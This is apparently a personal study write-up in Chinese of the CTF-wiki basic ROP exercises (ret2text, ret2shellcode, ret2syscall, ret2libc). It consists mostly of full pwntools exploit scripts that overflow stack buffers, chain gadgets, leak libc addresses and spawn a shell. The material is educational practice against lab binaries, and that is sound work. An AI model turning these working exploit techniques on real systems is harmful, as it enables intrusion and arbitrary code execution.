# ctfwiki---基本ROP

## 简介
ROP(Return Oriented Programming)  
其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。  

ctfwiki是一个很好的学习网站：https://ctf-wiki.github.io/  
这里把ctfwiki的基本ROP例子做一遍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/  


## ret2text
有栈溢出，但栈不可执行  
有 shell 调用：  
```
.text:0804863A mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641 call    _system         ; Call Pro
```

所以用 ROP，这里其实就是把 main 的返回地址改成 0804863A  

需要找到输入点到返回地址的偏移：  
```
# 返回地址的位置
FFFFD2EC  F7DECE81  libc_2.27.so:__libc_start_main+F1
# 输入点的位置
FFFFD27C
```
偏移 0x70，然后就是脚本了  
```python
# coding:utf8

from pwn import  *

conn = process('./ret2text')

payload = 'a'*0x70 + p32(0x0804863A)    

conn.sendline(payload)
conn.interactive()
```

记得把系统的地址随机化关掉  


## ret2shellcode
buf2 在 bss 段， 在 gdb 下用 vmmap 命令确定 bss 段可执行，所以把 shellcode 写到 buf2，跳过去，就可以了  
```python
# coding:utf8

'''
FFFFD2DC  F7DECE81  libc_2.27.so:__libc_start_main+F1
FFFFD26C
'''

from pwn import  *

shellcode = asm(shellcraft.sh())
print(len(shellcode))

conn = process('./ret2shellcode')

# payload = shellcode + 'a'*(0x70-len(shellcode)) + p32(0x0804A080)
# 上面的写法太丑了
payload = shellcode.ljust(0x70, 'a') + p32(0x0804A080)

conn.sendline(payload)
conn.interactive()
```

虽然可以直接写到栈上，但栈地址经常变化，又找不到 "jmp esp" 这样的片段，倒是可以用 nop 滑一段距离，但还是感觉不稳定，果然有固定的地址比较好呀  


## ret2syscall
关键点就是在栈上构建 ROP 链，实现系统调用，也就是构造这个东西：  
```c
execve("/bin/sh",NULL,NULL)

其中，该程序是 32 位，所以我们需要使得

系统调用号，即 eax 应该为 0xb
第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
第二个参数，即 ecx 应该为 0
第三个参数，即 edx 应该为 0
```

然后要知道 `int 0x80` 就是 syscall，意思就是系统调用。  

按照惯例贴脚本，payload 就不解释了，有点简单：  
```python
# coding:utf8

'''
0x080bb196 : pop eax ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x080be408 : /bin/sh
0x08049421 : int 0x80

0xffffd2cc --> 0x804907a (<__libc_start_main+458>:	mov    DWORD PTR [esp],eax)
0xffffd25c --> 0x3
'''

from pwn import  *


pop_eax_ret_addr = 0x080bb196
pop_edx_ecx_ebx_ret_addr = 0x0806eb90
bin_sh_addr = 0x080be408
int_addr = 0x08049421

conn = process('./ret2syscall')

# payload = 'a' * 0x70 + p32(pop_eax_ret_addr) + p32(0xb) + p32(pop_edx_ecx_ebx_ret_addr) + p32(0) + p32(0) + p32(bin_sh_addr) + p32(int_addr)
# 上面的 payload 很丑，用下面的
payload = flat(['a' * 0x70, pop_eax_ret_addr, 0xb, pop_edx_ecx_ebx_ret_addr, 0, 0, bin_sh_addr, int_addr])

conn.sendline(payload)
conn.interactive()
```


## ret2libc

### 例1
这个的特征是：gets函数有栈溢出，程序里的secure函数调用了system，然后程序里可以搜到'/bin/sh'字符串。  
所以思路就是设置system函数的参数为'/bin/sh'，跳到执行system函数的地方，就能拿到shell了。  
先看一个错误的脚本：  
```python
#coding :utf8

'''
main func return value addr:
0000| 0xffffd0ac --> 0xf7de9ee5 (<__libc_start_main+245>:	add    esp,0x10)
my input addr
0000| 0xffffd020 --> 0xffffd03c ("hello")
bin_sh_addr
.rodata:08048720 aBinSh          db '/bin/sh',0
call_system_addr
.text:08048611                 call    _system
'''

from pwn import *

exe = ELF("./ret2libc1")

context.binary = exe

bin_sh_addr = 0x08048720
call_system_addr = 0x08048611

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    if args.G:
        gdb.attach(r)


    payload = flat(['a' * 0x88, bin_sh_addr, call_system_addr])
    r.recvuntil('RET2LIBC >_<')
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

第1点错误：输入字符串的位置看错了，导致填充'a'字符串的长度错了，应该是 `0xffffd0ac-0xffffd03c`，而不是 `0xffffd0ac-0xffffd020`  
第2点错误：栈的结构想错了，导致参数放在了低地址，实际应该在高地址，时刻记住，栈由高到低增长，想不通可以画示意图  

明白了上面的错误，看一下正确的脚本吧：  
```python
#coding :utf8

'''
main func return value addr:
0000| 0xffffd0ac --> 0xf7de9ee5 (<__libc_start_main+245>:	add    esp,0x10)
my input addr
0000| 0xffffd020 --> 0xffffd03c ("hello")
bin_sh_addr
.rodata:08048720 aBinSh          db '/bin/sh',0
call_system_addr
.text:08048611                 call    _system
'''

from pwn import *

exe = ELF("./ret2libc1")

context.binary = exe

bin_sh_addr = 0x08048720
call_system_addr = 0x08048611

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    if args.G:
        gdb.attach(r)


    payload = flat(['a' * 0x70, call_system_addr, bin_sh_addr])
    r.recvuntil('RET2LIBC >_<')
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

### 例2
和上面的类似，只是这次没了`/bin/sh`字符串，所以需要自己构造ROP读入这样的字符串，自己没想出来，这是网站上的脚本：  
```python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

大概逻辑就是先跳到gets去读字符串，然后跳到system执行系统命令  
说3个点：  
1. 脚本中用了bss段的buf2的地址，因为bss段的地址不变，比buf2地址小一点也是可以的
2. `pop_ebx`的作用是把栈上buf2的地址弹出来，这个地址一开始是gets函数用的，在这个例子里，只有`pop_ebx`符合条件，没有其它好的pop
3. 读的字符串可以是 '/bin/sh', '/bin/bash', 'sh', 'bash'，用第1个应该是考虑到更通用一些
4. 0xdeadbeef 只是为了填充栈，换成 'b' * 4 也没问题

自己再写一遍，加强记忆  
```python
# coding:utf8
# python3

'''
main return addr
0000| 0xffffd01c --> 0xf7de8ee5 (<__libc_start_main+245>:	add    esp,0x10)

my input addr 
0000| 0xffffcf90 --> 0xffffcfac ("hello")

0x70

gets addr
0x08048460

call system addr
0x08048641

pop thing addr
0x0804843d : pop ebx ; ret

buf2 addr
0x0804A080


'''

from pwn import *

exe = ELF('ret2libc2')

context.binary = exe

gets_addr = 0x08048460
call_system_addr = 0x08048641
pop_ebx_addr = 0x0804843d
buf2_addr = 0x0804A080


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote('addr', 1337)


def main():
    r = conn()

    if args.G:
        gdb.attach(r)

    payload = flat(['a'*0x70, gets_addr, pop_ebx_addr, buf2_addr, call_system_addr, buf2_addr])

    r.sendline(payload)
    r.sendline('/bin/bash')

    r.interactive()


if __name__ == '__main__':
    main()

```

另外例2的思路对例1也是生效的，只是相关地址有所变化。  

### 例3
手动指定libc位置，成功的脚本：  
```python
# coding:utf8
# python3

from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')
libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')

puts_plt = ret2libc3.plt['puts']
libc_puts_got = ret2libc3.got['puts']
main = ret2libc3.symbols['main']

print("leak libc_puts_got addr and return to main again")
payload = flat(['A' * 112, puts_plt, main, libc_puts_got])
sh.sendlineafter('Can you find it !?', payload)

print("get the related addr")
libc_puts_addr = u32(sh.recv()[0:4])
libcbase = libc_puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']
binsh_addr = libcbase + next(libc.search(b'/bin/sh'))

print("get shell")
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```
第1次填充112，第2次填充104，是第2次直接跳到main开头地址，所以栈上弹出的2个地址让栈顶降低了，另外试一下跳到_start，两次填充的长度就一样了  

利用的大概流程就是先找一个远程机器已经执行过的函数地址，和本地libc的函数地址对比，得到偏移，继而推出其他函数在远程机器的地址，这样就能调用远程机器的函数了  

一开始用LibcSearcher找不到对应的libc，用这样的方法把本机的32位libc加到库里：  
```
cd ~/LibcSearcher/libc-database/
./add /lib/i386-linux-gnu/libc.so.6
```
这样之后再执行官方提供的脚本，就没问题了，脚本如下：  
```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print("leak libc_start_main_got addr and return to main again")
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

print("get the related addr")
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("get shell")
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

自己重写了一遍，如下：  
```python
# coding:utf8
# python3

'''
0000| 0xffffcfac --> 0xf7e1d647 (<__libc_start_main+247>:	add    esp,0x10)
0000| 0xffffcf20 --> 0xffffcf3c ('hello')

0x70
'''

from pwn import *
from LibcSearcher import *

exe = ELF('ret2libc3')

context.binary = exe

puts_plt = exe.plt['puts']
start_symbol = exe.symbols['_start']
puts_got = exe.got['puts']


def conn():
    if args.REMOTE:
        return remote('addr', 1337)
    else:
        return process([exe.path])


def main():
    r = conn()

    payload1 = flat(['a'*0x70, puts_plt, start_symbol, puts_got])
    r.sendlineafter('Can you find it !?', payload1)
    recv_content = r.recv()
    real_puts_addr = u32(recv_content[:4])

    libc = LibcSearcher('puts', real_puts_addr)
    libc_base = real_puts_addr - libc.dump('puts')
    real_system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')

    payload2 = flat(['a'*0x70, real_system_addr, 'b'*4, bin_sh_addr])
    r.sendline(payload2)

    r.interactive()


if __name__ == '__main__':
    main()
```

例2/例1也可以用这样的攻击方式  

这是例2用这种方式的脚本：  
```python
# coding:utf8
# python3

'''
0000| 0xffffcfac --> 0xf7e1d647 (<__libc_start_main+247>:	add    esp,0x10)
0000| 0xffffcf20 --> 0xffffcf3c ('hello')

0x70
'''

from pwn import *
from LibcSearcher import *

exe = ELF('ret2libc2')

context.binary = exe

puts_plt = exe.plt['puts']
start_symbol = exe.sym['_start']
puts_got = exe.got['puts']


def conn():
    if args.REMOTE:
        return remote('addr', 1337)
    else:
        return process([exe.path])


def main():
    r = conn()

    payload1 = flat(['a'*0x70, puts_plt, start_symbol, puts_got])
    r.sendlineafter('What do you think ?', payload1)
    recv_content = r.recv()
    real_puts_addr = u32(recv_content[:4])

    libc = LibcSearcher('puts', real_puts_addr)
    libc_base = real_puts_addr - libc.dump('puts')
    real_system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')

    payload2 = flat(['a'*0x70, real_system_addr, 'b'*4, bin_sh_addr])
    r.sendline(payload2)

    r.interactive()


if __name__ == '__main__':
    main()

```

这是例1用这种方式的脚本：  
```python
# coding:utf8
# python3

'''
0000| 0xffffcfac --> 0xf7e1d647 (<__libc_start_main+247>:	add    esp,0x10)
0000| 0xffffcf20 --> 0xffffcf3c ("hello")

0x70
'''

from pwn import *
from LibcSearcher import *

exe = ELF('ret2libc1')

context.binary = exe
context.log_level = 'debug'

puts_plt = exe.plt['puts']
start_symbol = exe.sym['_start']
puts_got = exe.got['puts']


def conn():
    if args.REMOTE:
        return remote('addr', 1337)
    else:
        return process([exe.path])


def main():
    r = conn()

    payload1 = flat(['a'*0x70, puts_plt, start_symbol, puts_got])
    r.sendlineafter('RET2LIBC >_<\n', payload1)
    recv_content = r.recv()
    real_puts_addr = u32(recv_content[:4])

    libc = LibcSearcher('puts', real_puts_addr)
    libc_base = real_puts_addr - libc.dump('puts')
    real_system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')

    payload2 = flat(['a'*0x70, real_system_addr, 'b'*4, bin_sh_addr])
    r.sendline(payload2)

    r.interactive()


if __name__ == '__main__':
    main()

```

需要注意的一点就是，例1用puts输出，例2/例3用printf输出，而puts输出默认会有一个换行，在设置等待接收字符串时加个换行就可以了。  


2020/11/29  
